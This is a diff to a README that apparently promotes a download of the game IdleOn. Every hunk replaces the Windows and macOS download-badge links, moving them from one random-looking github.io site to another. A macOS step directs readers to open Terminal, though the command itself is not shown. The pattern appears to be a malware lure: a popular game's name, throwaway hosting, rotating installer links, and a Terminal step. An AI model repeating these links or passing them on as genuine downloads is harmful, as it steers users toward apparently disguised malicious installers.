@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download IdleOn — The Incremental MMO](https://img.shields.io/badge/⬇_Download_IdleOn%20—%20The%20Incremental%20MMO-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download IdleOn — The Incremental MMO](https://img.shields.io/badge/⬇_Download_IdleOn%20—%20The%20Incremental%20MMO-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -65,9 +65,9 @@ IdleOn is a unique idle MMO where all your characters play simultaneously across
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -85,7 +85,7 @@ IdleOn is a unique idle MMO where all your characters play simultaneously across
 
 <div align="center">
 
-[![⬇ Download IdleOn — The Incremental MMO](https://img.shields.io/badge/⬇_Download_IdleOn%20—%20The%20Incremental%20MMO-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download IdleOn — The Incremental MMO](https://img.shields.io/badge/⬇_Download_IdleOn%20—%20The%20Incremental%20MMO-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -117,7 +117,7 @@ IdleOn is a unique idle MMO where all your characters play simultaneously across
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -142,7 +142,7 @@ IdleOn is a unique idle MMO where all your characters play simultaneously across
 
 <div align="center">
 
-[![⬇ Download IdleOn — The Incremental MMO](https://img.shields.io/badge/⬇_Download_IdleOn%20—%20The%20Incremental%20MMO-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download IdleOn — The Incremental MMO](https://img.shields.io/badge/⬇_Download_IdleOn%20—%20The%20Incremental%20MMO-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
